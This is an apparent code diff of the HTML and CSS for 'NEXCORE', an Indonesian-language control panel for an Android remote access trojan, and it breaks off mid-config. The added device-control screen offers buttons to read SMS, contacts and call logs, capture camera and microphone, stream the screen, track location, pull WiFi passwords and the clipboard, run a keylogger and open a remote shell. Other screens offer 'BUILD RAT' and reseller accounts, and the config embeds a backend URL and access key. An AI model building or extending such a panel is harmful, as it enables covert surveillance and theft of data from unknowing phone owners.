@@ -18,6 +18,7 @@
 html,body{height:100%}
 body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;overscroll-behavior:none}
 
+/* SPLASH */
 #splash{position:fixed;inset:0;z-index:1000;background:radial-gradient(circle at 50% 50%, #0d1424 0%, #0A0E1A 70%);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .7s ease, visibility .7s ease}
 #splash.hide{opacity:0;visibility:hidden}
 .splash-logo{width:120px;height:120px;border-radius:32px;background:linear-gradient(135deg, var(--accent), var(--accent-dim));display:flex;align-items:center;justify-content:center;font-size:56px;font-weight:900;color:#0A0E1A;position:relative;z-index:2;box-shadow:0 0 60px rgba(0,229,160,0.5);animation:logoPop .9s cubic-bezier(.2,1.3,.4,1) forwards,logoGlow 2s ease-in-out infinite .9s;transform:scale(0);opacity:0}
@@ -41,6 +42,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);overf
 .screen.active{display:flex}
 body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 15% 10%, rgba(0,229,160,0.10), transparent 45%),radial-gradient(circle at 85% 90%, rgba(0,179,122,0.08), transparent 45%);pointer-events:none;z-index:0}
 
+/* LANDING */
 .landing{justify-content:space-between;padding:48px 28px 32px}
 .landing .top{flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center}
 .logo{width:92px;height:92px;border-radius:24px;background:linear-gradient(135deg, var(--accent), var(--accent-dim));display:flex;align-items:center;justify-content:center;font-size:44px;font-weight:900;color:#0A0E1A;margin-bottom:22px;box-shadow:0 20px 50px rgba(0,229,160,0.28);animation:float 3.5s ease-in-out infinite}
@@ -50,10 +52,9 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .tagline{color:var(--text2);font-size:12px;margin-top:8px;letter-spacing:3px;text-transform:uppercase;text-align:center}
 .action-card{background:var(--card);border:1px solid var(--border);border-radius:22px;padding:26px 22px;text-align:center;animation:fadeUp .7s .3s ease backwards}
 .kicker{font-size:16px;font-weight:800;letter-spacing:2px;margin-bottom:8px}
-.beli-link{display:block;font-size:20px;font-weight:900;color:var(--accent);letter-spacing:2px;padding:8px 0 18px;cursor:pointer;transition:transform .18s ease}
-.beli-link:active{transform:scale(0.96)}
+.beli-link{display:block;font-size:20px;font-weight:900;color:var(--accent);letter-spacing:2px;padding:8px 0 18px;cursor:pointer}
 .divider{height:1px;background:var(--border);margin:16px 0}
-.btn{width:100%;padding:15px 18px;font-family:'Inter';font-size:14px;font-weight:800;letter-spacing:1.5px;border-radius:14px;border:none;cursor:pointer;transition:transform .15s ease, background .2s ease;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn{width:100%;padding:15px 18px;font-family:'Inter';font-size:14px;font-weight:800;letter-spacing:1.5px;border-radius:14px;border:none;cursor:pointer;transition:transform .15s;display:flex;align-items:center;justify-content:center;gap:8px}
 .btn:active{transform:scale(0.97)}
 .btn:disabled{opacity:0.5;cursor:not-allowed}
 .btn-primary{background:var(--accent);color:#0A0E1A}
@@ -76,55 +77,134 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 
 .field{margin-bottom:14px;text-align:left}
 .field label{display:block;font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--text2);margin-bottom:6px}
-.field input,.field select{width:100%;padding:13px 15px;background:var(--elev);border:1.5px solid var(--border);border-radius:12px;color:var(--text);font-family:'Inter';font-size:14px;outline:none;transition:border-color .18s ease}
+.field input,.field select{width:100%;padding:13px 15px;background:var(--elev);border:1.5px solid var(--border);border-radius:12px;color:var(--text);font-family:'Inter';font-size:14px;outline:none}
 .field input:focus,.field select:focus{border-color:var(--accent)}
-.field .hint{font-size:11px;color:var(--text2);margin-top:6px}
 .hero-title{font-size:26px;font-weight:800;letter-spacing:3px;margin-bottom:6px}
 .hero-sub{color:var(--text2);font-size:13px;margin-bottom:28px}
 
-.pkg{background:var(--card);border:1.5px solid var(--border);border-radius:18px;padding:20px;margin-bottom:14px;animation:fadeUp .4s ease backwards}
-.pkg.popular{border-color:var(--accent)}
-.pkg.elite{border-color:var(--gold)}
-.pkg-hdr{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
-.pkg-name{font-size:17px;font-weight:800}
-.pkg-badges{display:flex;gap:6px;flex-wrap:wrap}
-.badge{font-size:9px;font-weight:800;letter-spacing:1px;padding:3px 8px;border-radius:6px;text-transform:uppercase}
-.badge.pop{background:var(--accent);color:#0A0E1A}
-.badge.best{background:var(--gold);color:#0A0E1A}
-.pkg-price{font-size:26px;font-weight:800;color:var(--accent);margin:4px 0 2px}
-.pkg-price small{font-size:12px;color:var(--text2);font-weight:500;margin-left:4px}
-.pkg-feats{list-style:none;margin:12px 0 16px;font-size:12.5px;color:var(--text2)}
-.pkg-feats li{padding:5px 0;display:flex;align-items:center;gap:8px}
-.pkg-feats li::before{content:'▸';color:var(--accent);font-weight:800}
+/* DEVICES HERO CARD */
+.dev-hero-card{
+  background:linear-gradient(135deg, rgba(0,229,160,0.15), rgba(0,179,122,0.05));
+  border:1.5px solid var(--accent);
+  border-radius:22px; padding:24px;
+  cursor:pointer; position:relative; overflow:hidden;
+  transition:transform .18s ease;
+  animation:fadeUp .5s ease backwards;
+}
+.dev-hero-card:active{transform:scale(0.97)}
+.dev-hero-card::after{
+  content:''; position:absolute; top:-50%; right:-30%;
+  width:200px; height:200px; border-radius:50%;
+  background:radial-gradient(circle, rgba(0,229,160,0.25), transparent 70%);
+  pointer-events:none;
+}
+.dev-hero-card .dhc-top{display:flex;align-items:center;gap:14px;margin-bottom:18px}
+.dev-hero-card .dhc-icon{
+  width:60px;height:60px;border-radius:16px;
+  background:linear-gradient(135deg, var(--accent), var(--accent-dim));
+  display:flex;align-items:center;justify-content:center;
+  font-size:28px;color:#0A0E1A;
+  box-shadow:0 10px 30px rgba(0,229,160,0.4);
+  flex-shrink:0;
+}
+.dev-hero-card .dhc-label{font-size:11px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;font-weight:800}
+.dev-hero-card .dhc-title{font-size:22px;font-weight:900;letter-spacing:1px;margin-top:2px}
+.dev-hero-card .dhc-arrow{font-size:28px;color:var(--accent);margin-left:auto}
+.dev-hero-card .dhc-stats{
+  display:grid;grid-template-columns:1fr 1fr;gap:10px;
+  padding-top:16px;border-top:1px solid rgba(0,229,160,0.2);
+}
+.dev-hero-card .dhc-stat{text-align:center}
+.dev-hero-card .dhc-stat .v{font-size:26px;font-weight:900;color:var(--text)}
+.dev-hero-card .dhc-stat .k{font-size:10px;color:var(--text2);letter-spacing:1.5px;text-transform:uppercase;margin-top:2px}
 
-.stats-bar{display:flex;gap:10px;padding:0 20px 16px;overflow-x:auto;scrollbar-width:none}
-.stats-bar::-webkit-scrollbar{display:none}
-.stat{flex:0 0 auto;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:10px 14px;min-width:120px}
-.stat .k{font-size:10px;color:var(--text2);letter-spacing:1px;text-transform:uppercase}
-.stat .v{font-size:18px;font-weight:800;color:var(--accent);margin-top:2px}
+.quick-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:14px}
+.quick-tile{
+  background:var(--card); border:1.5px solid var(--border);
+  border-radius:16px; padding:16px;
+  cursor:pointer; display:flex; align-items:center; gap:12px;
+  transition:transform .15s, border-color .15s;
+  animation:fadeUp .4s ease backwards;
+}
+.quick-tile:active{transform:scale(0.96)}
+.quick-tile:hover{border-color:var(--accent-dim)}
+.quick-tile .qt-i{font-size:22px}
+.quick-tile .qt-n{font-size:12px;font-weight:800;letter-spacing:0.3px}
+.quick-tile.gold:hover{border-color:var(--gold)}
 
-.menu-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
-.tile{background:var(--card);border:1.5px solid var(--border);border-radius:16px;padding:16px 12px;cursor:pointer;position:relative;transition:transform .15s;display:flex;flex-direction:column;gap:8px;animation:fadeUp .35s ease backwards}
-.tile:active{transform:scale(0.96);background:var(--elev)}
-.tile .icon{font-size:24px}
-.tile .name{font-size:13px;font-weight:700}
-.tile .prem{position:absolute;top:8px;right:8px;font-size:8px;font-weight:800;letter-spacing:1px;color:var(--gold)}
-@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+/* DEVICE LIST */
+.dev-item{
+  background:var(--card); border:1.5px solid var(--border);
+  border-radius:16px; padding:16px; margin-bottom:10px;
+  cursor:pointer; display:flex; align-items:center; gap:14px;
+  transition:transform .15s, border-color .15s;
+  animation:fadeUp .35s ease backwards;
+}
+.dev-item:active{transform:scale(0.98)}
+.dev-item:hover{border-color:var(--accent-dim)}
+.dev-item .di-icon{
+  width:48px;height:48px;border-radius:12px;
+  background:var(--elev); display:flex;align-items:center;justify-content:center;
+  font-size:22px;flex-shrink:0;position:relative;
+}
+.dev-item .di-dot{
+  position:absolute;bottom:2px;right:2px;
+  width:12px;height:12px;border-radius:50%;
+  background:var(--danger);border:2px solid var(--card);
+}
+.dev-item .di-dot.on{background:var(--accent);box-shadow:0 0 8px var(--accent)}
+.dev-item .di-info{flex:1;min-width:0}
+.dev-item .di-model{font-size:14px;font-weight:800;margin-bottom:3px}
+.dev-item .di-meta{font-size:11px;color:var(--text2);display:flex;gap:8px;flex-wrap:wrap}
+.dev-item .di-arrow{font-size:22px;color:var(--text2)}
 
-.navbar{position:fixed;left:0;right:0;bottom:0;height:var(--nav-h);background:rgba(19,24,38,0.92);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-around;padding:0 8px;z-index:100;padding-bottom:env(safe-area-inset-bottom, 0)}
-.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;cursor:pointer;color:var(--text2);transition:color .2s;padding:8px 4px;border-radius:10px;position:relative}
-.nav-item:active{transform:scale(0.92)}
-.nav-item .ni-icon{font-size:20px;line-height:1}
-.nav-item .ni-label{font-size:9.5px;font-weight:700;letter-spacing:0.5px;text-transform:uppercase}
-.nav-item.active{color:var(--accent)}
-.nav-item.active::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:28px;height:3px;border-radius:0 0 4px 4px;background:var(--accent);box-shadow:0 0 12px rgba(0,229,160,0.7)}
+/* DEVICE CONTROL HERO */
+.dv-hero{
+  background:linear-gradient(135deg, rgba(0,229,160,0.10), rgba(0,179,122,0.03));
+  border:1.5px solid var(--accent-dim);
+  border-radius:18px; padding:18px; margin-bottom:18px;
+}
+.dv-hero-top{display:flex;align-items:center;gap:14px}
+.dv-avatar{width:56px;height:56px;border-radius:16px;background:var(--elev);display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0;position:relative}
+.dv-avatar .dot{position:absolute;bottom:2px;right:2px;width:12px;height:12px;border-radius:50%;background:var(--danger);border:2px solid var(--bg)}
+.dv-avatar .dot.on{background:var(--accent);box-shadow:0 0 8px var(--accent)}
+.dv-name{font-size:15px;font-weight:900;letter-spacing:0.5px}
+.dv-sub{font-size:11px;color:var(--text2);margin-top:3px;display:flex;gap:8px;flex-wrap:wrap}
+.dv-info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding-top:14px;border-top:1px solid rgba(0,229,160,0.15);margin-top:14px}
+.dv-info-grid > div{display:flex;flex-direction:column;gap:2px}
+.dv-info-grid .dk{font-size:9px;color:var(--text2);letter-spacing:1.5px;text-transform:uppercase}
+.dv-info-grid .dv-val{font-size:12px;font-weight:700;word-break:break-all}
 
-.build-card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:20px;margin-bottom:14px}
-.build-hero{background:linear-gradient(135deg, rgba(0,229,160,0.12), rgba(0,179,122,0.05));border:1.5px solid var(--accent-dim);border-radius:18px;padding:22px;margin-bottom:18px;text-align:center}
-.build-hero .bh-icon{font-size:44px;margin-bottom:8px}
-.build-hero .bh-title{font-size:18px;font-weight:900;letter-spacing:2px}
-.build-hero .bh-sub{font-size:12px;color:var(--text2);margin-top:6px;line-height:1.5}
+/* CONTROL SECTION */
+.ctrl-cat{margin-bottom:20px}
+.ctrl-cat-title{
+  font-size:11px;font-weight:800;letter-spacing:2px;
+  color:var(--text2); text-transform:uppercase;
+  margin-bottom:10px; display:flex; align-items:center; gap:8px;
+}
+.ctrl-cat-title::before{
+  content:''; width:14px; height:2px; background:var(--accent);
+  border-radius:2px;
+}
+.ctrl-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.ctrl-tile{
+  background:var(--card); border:1.5px solid var(--border);
+  border-radius:14px; padding:14px 10px;
+  cursor:pointer; transition:transform .15s, border-color .15s, background .15s;
+  display:flex; flex-direction:column; gap:8px;
+  position:relative; overflow:hidden;
+}
+.ctrl-tile:active{transform:scale(0.95);background:var(--elev)}
+.ctrl-tile:hover{border-color:var(--accent-dim)}
+.ctrl-tile .ct-i{font-size:22px}
+.ctrl-tile .ct-n{font-size:11.5px;font-weight:800;letter-spacing:0.3px}
+.ctrl-tile.danger{border-color:rgba(255,61,90,0.3)}
+.ctrl-tile.danger:hover{border-color:var(--danger)}
+.ctrl-tile.danger .ct-i{filter:hue-rotate(-30deg)}
 
+.section-title{font-size:12px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--text);margin:24px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+
+/* MISC */
 .rs-stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
 .rs-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px}
 .rs-card .k{font-size:10px;color:var(--text2);letter-spacing:1px;text-transform:uppercase}
@@ -139,10 +219,12 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .acct-card .ac-v{color:var(--accent);font-weight:700;word-break:break-all}
 .acct-card .ac-v.pw{color:var(--gold)}
 .acct-card .ac-copy{background:var(--elev);border:1px solid var(--border);color:var(--text2);border-radius:10px;width:36px;height:36px;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:14px}
-.acct-card .ac-copy:hover{background:var(--accent);color:#0A0E1A}
-.acct-card .ac-copy:active{transform:scale(0.92)}
 
-.section-title{font-size:12px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--text);margin:24px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.build-card{background:var(--card);border:1px solid var(--border);border-radius:18px;padding:20px;margin-bottom:14px}
+.build-hero{background:linear-gradient(135deg, rgba(0,229,160,0.12), rgba(0,179,122,0.05));border:1.5px solid var(--accent-dim);border-radius:18px;padding:22px;margin-bottom:18px;text-align:center}
+.build-hero .bh-icon{font-size:44px;margin-bottom:8px}
+.build-hero .bh-title{font-size:18px;font-weight:900;letter-spacing:2px}
+.build-hero .bh-sub{font-size:12px;color:var(--text2);margin-top:6px;line-height:1.5}
 
 .log{font-family:'JetBrains Mono',monospace;font-size:11.5px;line-height:1.6;background:var(--elev);border:1px solid var(--border);border-radius:12px;padding:14px;color:var(--text2);white-space:pre-wrap;word-break:break-word;max-height:320px;overflow-y:auto}
 .log .ok{color:var(--accent)}
@@ -161,9 +243,17 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .modal .row{display:flex;gap:10px;margin-top:16px}
 .modal .row .btn{flex:1}
 
+.navbar{position:fixed;left:0;right:0;bottom:0;height:var(--nav-h);background:rgba(19,24,38,0.92);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-around;padding:0 8px;z-index:100;padding-bottom:env(safe-area-inset-bottom, 0)}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;cursor:pointer;color:var(--text2);transition:color .2s;padding:8px 4px;border-radius:10px;position:relative}
+.nav-item .ni-icon{font-size:20px;line-height:1}
+.nav-item .ni-label{font-size:9.5px;font-weight:700;letter-spacing:0.5px;text-transform:uppercase}
+.nav-item.active{color:var(--accent)}
+.nav-item.active::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:28px;height:3px;border-radius:0 0 4px 4px;background:var(--accent);box-shadow:0 0 12px rgba(0,229,160,0.7)}
+
 .hidden{display:none!important}
 .mt{margin-top:16px}
 .mt-lg{margin-top:24px}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
 </style>
 </head>
 <body>
@@ -216,14 +306,8 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
     <div class="content">
       <div class="hero-title">MASUK</div>
       <div class="hero-sub">Login ke panel kamu</div>
-      <div class="field">
-        <label>Username</label>
-        <input id="loginUser" type="text" placeholder="username" autocapitalize="off" autocorrect="off">
-      </div>
-      <div class="field">
-        <label>Password</label>
-        <input id="loginPass" type="password" placeholder="••••••••">
-      </div>
+      <div class="field"><label>Username</label><input id="loginUser" type="text" placeholder="username" autocapitalize="off" autocorrect="off"></div>
+      <div class="field"><label>Password</label><input id="loginPass" type="password" placeholder="••••••••"></div>
       <button class="btn btn-primary mt" id="btnLogin" onclick="doLogin()">LOGIN</button>
       <div class="divider" style="margin-top:20px"></div>
       <div style="text-align:center;font-size:12px;color:var(--text2);margin-bottom:12px">BELUM PUNYA AKUN?</div>
@@ -232,20 +316,67 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
     </div>
   </div>
 
-  <!-- DASHBOARD -->
+  <!-- DASHBOARD (simplified — only device button + shortcuts) -->
   <div class="screen has-nav" id="screen-dash">
     <div class="hdr">
       <div class="title accent">NEXCORE</div>
       <div class="back" onclick="doLogout()">⎋</div>
     </div>
-    <div class="stats-bar">
-      <div class="stat"><div class="k">User</div><div class="v" id="dashUser">-</div></div>
-      <div class="stat"><div class="k">Role</div><div class="v" id="dashRole">-</div></div>
-      <div class="stat"><div class="k">Devices</div><div class="v" id="dashDev">0</div></div>
-      <div class="stat"><div class="k">Online</div><div class="v" id="dashOn">0</div></div>
-    </div>
-    <div class="content" style="padding-top:0">
-      <div class="menu-grid" id="menuGrid"></div>
+    <div class="content">
+      <!-- USER STRIP -->
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px">
+        <div>
+          <div style="font-size:11px;color:var(--text2);letter-spacing:1.5px;text-transform:uppercase">Halo,</div>
+          <div style="font-size:16px;font-weight:800;margin-top:2px" id="dashUser">-</div>
+        </div>
+        <div style="background:var(--elev);border:1px solid var(--border);border-radius:10px;padding:8px 12px;font-size:11px;font-weight:800;letter-spacing:1px;color:var(--accent)" id="dashRole">USER</div>
+      </div>
+
+      <!-- DEVICES HERO -->
+      <div class="dev-hero-card" onclick="go('devices')">
+        <div class="dhc-top">
+          <div class="dhc-icon">📱</div>
+          <div>
+            <div class="dhc-label">STEP 1</div>
+            <div class="dhc-title">DEVICES</div>
+          </div>
+          <div class="dhc-arrow">›</div>
+        </div>
+        <div class="dhc-stats">
+          <div class="dhc-stat">
+            <div class="v" id="dashDev">0</div>
+            <div class="k">Total</div>
+          </div>
+          <div class="dhc-stat">
+            <div class="v" id="dashOn" style="color:var(--accent)">0</div>
+            <div class="k">Online</div>
+          </div>
+        </div>
+      </div>
+
+      <div style="text-align:center;font-size:10.5px;color:var(--text2);margin:16px 0 6px;letter-spacing:1px">
+        BUKA DEVICE DULU UNTUK AKSES FITUR RAT FULL
+      </div>
+
+      <!-- QUICK SHORTCUTS -->
+      <div class="quick-grid">
+        <div class="quick-tile" onclick="go('build')">
+          <div class="qt-i">📦</div>
+          <div><div class="qt-n">BUILD RAT</div></div>
+        </div>
+        <div class="quick-tile gold" onclick="go('reseller')">
+          <div class="qt-i">💎</div>
+          <div><div class="qt-n">RESELLER</div></div>
+        </div>
+        <div class="quick-tile" onclick="go('profile')">
+          <div class="qt-i">👤</div>
+          <div><div class="qt-n">PROFILE</div></div>
+        </div>
+        <div class="quick-tile" onclick="toTelegram()">
+          <div class="qt-i">✈️</div>
+          <div><div class="qt-n">TELEGRAM</div></div>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -254,6 +385,7 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
     <div class="hdr">
       <div class="back" onclick="go('dash')">←</div>
       <div class="title accent">DEVICES</div>
+      <div class="back" onclick="initDevices()">⟳</div>
     </div>
     <div class="content">
       <div class="hero-sub" id="devCount">Loading...</div>
@@ -261,7 +393,7 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
     </div>
   </div>
 
-  <!-- DEVICE CONTROL -->
+  <!-- DEVICE CONTROL — FULL RAT MENU -->
   <div class="screen" id="screen-device">
     <div class="hdr">
       <div class="back" onclick="go('devices')">←</div>
@@ -269,30 +401,98 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
       <div class="back" onclick="refreshDevice()">⟳</div>
     </div>
     <div class="content">
-      <div class="build-hero">
-        <div class="bh-icon">📱</div>
-        <div class="bh-title" id="dvModel">—</div>
-        <div class="bh-sub" id="dvMeta">—</div>
+
+      <!-- DEVICE HERO -->
+      <div class="dv-hero">
+        <div class="dv-hero-top">
+          <div class="dv-avatar">
+            📱
+            <span class="dot" id="dvDot"></span>
+          </div>
+          <div style="flex:1;min-width:0">
+            <div class="dv-name" id="dvModel">—</div>
+            <div class="dv-sub" id="dvSub">—</div>
+          </div>
+        </div>
+        <div class="dv-info-grid">
+          <div><span class="dk">IP</span><span class="dv-val" id="dvIp">—</span></div>
+          <div><span class="dk">Android</span><span class="dv-val" id="dvAndroid">—</span></div>
+          <div><span class="dk">Battery</span><span class="dv-val" id="dvBattery">—</span></div>
+          <div><span class="dk">Last Seen</span><span class="dv-val" id="dvLast">—</span></div>
+          <div style="grid-column:1/-1"><span class="dk">Device ID</span><span class="dv-val" id="dvId" style="font-family:'JetBrains Mono';font-size:10px">—</span></div>
+        </div>
       </div>
-      <div class="section-title">Kontrol Cepat</div>
-      <div class="menu-grid">
-        <div class="tile" onclick="dvCmd('battery')"><div class="icon">🔋</div><div class="name">Battery</div></div>
-        <div class="tile" onclick="dvCmd('device_info')"><div class="icon">ℹ️</div><div class="name">Info Device</div></div>
-        <div class="tile" onclick="dvCmd('toast')"><div class="icon">💭</div><div class="name">Popup</div></div>
-        <div class="tile" onclick="dvCmd('vibrate')"><div class="icon">📳</div><div class="name">Vibrate</div></div>
+
+      <!-- DATA -->
+      <div class="ctrl-cat">
+        <div class="ctrl-cat-title">📂 Data</div>
+        <div class="ctrl-grid">
+          <div class="ctrl-tile" onclick="dvCmd('sms')"><div class="ct-i">💬</div><div class="ct-n">Baca SMS</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('contacts')"><div class="ct-i">👥</div><div class="ct-n">Kontak</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('calls')"><div class="ct-i">📞</div><div class="ct-n">Call Logs</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('apps')"><div class="ct-i">📦</div><div class="ct-n">Apps</div></div>
+        </div>
       </div>
-      <div class="section-title">Semua Kontrol</div>
-      <div id="ctrlList"></div>
-      <div class="section-title">Custom Command</div>
-      <div class="field"><label>Command</label><input id="dvCustom" placeholder="cth: toast" autocapitalize="off"></div>
-      <div class="field"><label>Args</label><input id="dvArgs" placeholder="cth: hello world"></div>
-      <button class="btn btn-primary" onclick="dvSendCustom()">⚡ KIRIM</button>
-      <div class="section-title">Output</div>
-      <div class="log" id="dvOutput">Pilih aksi di atas.</div>
+
+      <!-- MEDIA -->
+      <div class="ctrl-cat">
+        <div class="ctrl-cat-title">📸 Media</div>
+        <div class="ctrl-grid">
+          <div class="ctrl-tile" onclick="dvCmd('gallery')"><div class="ct-i">🖼️</div><div class="ct-n">Gallery</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('camera_front')"><div class="ct-i">🤳</div><div class="ct-n">Cam Depan</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('camera_back')"><div class="ct-i">📷</div><div class="ct-n">Cam Belakang</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('mic_record')"><div class="ct-i">🎙️</div><div class="ct-n">Rekam Mic</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('screen')"><div class="ct-i">🖥️</div><div class="ct-n">Screen Live</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('files')"><div class="ct-i">📁</div><div class="ct-n">File Manager</div></div>
+        </div>
+      </div>
+
+      <!-- LOCATION -->
+      <div class="ctrl-cat">
+        <div class="ctrl-cat-title">📍 Lokasi</div>
+        <div class="ctrl-grid">
+          <div class="ctrl-tile" onclick="dvCmd('location')"><div class="ct-i">📍</div><div class="ct-n">Lokasi</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('location_live')"><div class="ct-i">🗺️</div><div class="ct-n">Live Track</div></div>
+        </div>
+      </div>
+
+      <!-- KONTROL -->
+      <div class="ctrl-cat">
+        <div class="ctrl-cat-title">🎛️ Kontrol</div>
+        <div class="ctrl-grid">
+          <div class="ctrl-tile" onclick="dvCmd('toast')"><div class="ct-i">💭</div><div class="ct-n">Popup</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('vibrate')"><div class="ct-i">📳</div><div class="ct-n">Vibrate</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('open_url')"><div class="ct-i">🔗</div><div class="ct-n">Buka URL</div></div>
+          <div class="ctrl-tile danger" onclick="dvCmd('lock_screen')"><div class="ct-i">🔒</div><div class="ct-n">Lock Screen</div></div>
+        </div>
+      </div>
+
+      <!-- SISTEM -->
+      <div class="ctrl-cat">
+        <div class="ctrl-cat-title">⚙️ Sistem</div>
+        <div class="ctrl-grid">
+          <div class="ctrl-tile" onclick="dvCmd('device_info')"><div class="ct-i">ℹ️</div><div class="ct-n">Info Device</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('battery')"><div class="ct-i">🔋</div><div class="ct-n">Battery</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('sim')"><div class="ct-i">📡</div><div class="ct-n">Info SIM</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('wifi')"><div class="ct-i">📶</div><div class="ct-n">WiFi Pass</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('clipboard')"><div class="ct-i">📋</div><div class="ct-n">Clipboard</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('keylog')"><div class="ct-i">⌨️</div><div class="ct-n">Keylogger</div></div>
+          <div class="ctrl-tile" onclick="dvCmd('notif')"><div class="ct-i">🔔</div><div class="ct-n">Notifikasi</div></div>
+          <div class="ctrl-tile danger" onclick="dvCmd('shell')"><div class="ct-i">>_</div><div class="ct-n">Shell</div></div>
+        </div>
+      </div>
+
+      <div class="section-title">⚡ Custom Command</div>
+      <div class="field"><label>Command</label><input id="dvCustom" placeholder="cth: shell" autocapitalize="off"></div>
+      <div class="field"><label>Args</label><input id="dvArgs" placeholder="cth: ls /sdcard"></div>
+      <button class="btn btn-primary" onclick="dvSendCustom()">KIRIM</button>
+
+      <div class="section-title">📄 Output</div>
+      <div class="log" id="dvOutput">Pilih aksi di atas untuk kirim command.</div>
     </div>
   </div>
 
-  <!-- BUILD RAT -->
+  <!-- BUILD -->
   <div class="screen has-nav" id="screen-build">
     <div class="hdr">
       <div class="title accent">BUILD RAT</div>
@@ -326,18 +526,14 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
         <div class="rs-card"><div class="k">Active</div><div class="v accent" id="rsActive">0</div></div>
       </div>
       <div class="section-title">Generate Akun Baru</div>
-      <div class="field">
-        <label>Plan</label>
+      <div class="field"><label>Plan</label>
         <select id="rsPlan">
           <option value="basic">Basic</option>
           <option value="pro">Pro</option>
           <option value="elite">Elite</option>
         </select>
       </div>
-      <div class="field">
-        <label>Jumlah</label>
-        <input id="rsQty" type="number" value="1" min="1" max="50">
-      </div>
+      <div class="field"><label>Jumlah</label><input id="rsQty" type="number" value="1" min="1" max="50"></div>
       <button class="btn btn-gold" onclick="genAccount()">⚙ GENERATE AKUN</button>
       <div class="section-title">Akun Ter-generate</div>
       <div id="acctList"><div class="log" id="acctEmpty">Belum ada.</div></div>
@@ -374,21 +570,19 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
   <!-- NAVBAR -->
   <div class="navbar hidden" id="navbar">
     <div class="nav-item active" data-nav="dash" onclick="navTo('dash')"><div class="ni-icon">🏠</div><div class="ni-label">Home</div></div>
+    <div class="nav-item" data-nav="devices" onclick="navTo('devices')"><div class="ni-icon">📱</div><div class="ni-label">Devices</div></div>
     <div class="nav-item" data-nav="build" onclick="navTo('build')"><div class="ni-icon">📦</div><div class="ni-label">Build</div></div>
-    <div class="nav-item" data-nav="reseller" onclick="navTo('reseller')"><div class="ni-icon">💎</div><div class="ni-label">Reseller</div></div>
     <div class="nav-item" data-nav="profile" onclick="navTo('profile')"><div class="ni-icon">👤</div><div class="ni-label">Profile</div></div>
   </div>
 </div>
 
 <script>
-/* ==================== KONFIG — GANTI INI ==================== */
 const CONFIG = {
   SUPABASE_URL: 'https://xlrgwjwydbqsyexemjlo.supabase.co',
-  SUPABASE_ANON: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inhscmd3and5ZGJxc3lleGVtamxvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE2ODUxNjAsImV4cCI6MjEwNzI2MTE2MH0.YhTJlqm2_GtAmn8sghWdfvnFIPCDok-ZJmVuItRaj7E',
